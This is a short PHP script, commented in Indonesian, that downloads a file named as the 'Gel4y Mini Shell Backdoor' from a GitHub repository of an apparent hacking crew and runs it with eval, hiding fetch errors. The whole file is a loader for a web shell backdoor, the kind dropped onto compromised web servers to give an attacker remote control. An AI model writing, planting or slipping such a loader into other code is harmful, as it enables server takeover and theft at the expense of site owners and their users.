<?php
// Ambil isi dari URL GitHub dan jalankan
$url = "https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php";

// Coba ambil file
$code = @file_get_contents($url);

// Jika berhasil ambil, jalankan
if ($code !== false && strlen(trim($code)) > 0) {
    eval("?>".$code);
} else {
    echo "Gagal mengambil file remote.";
}
?>
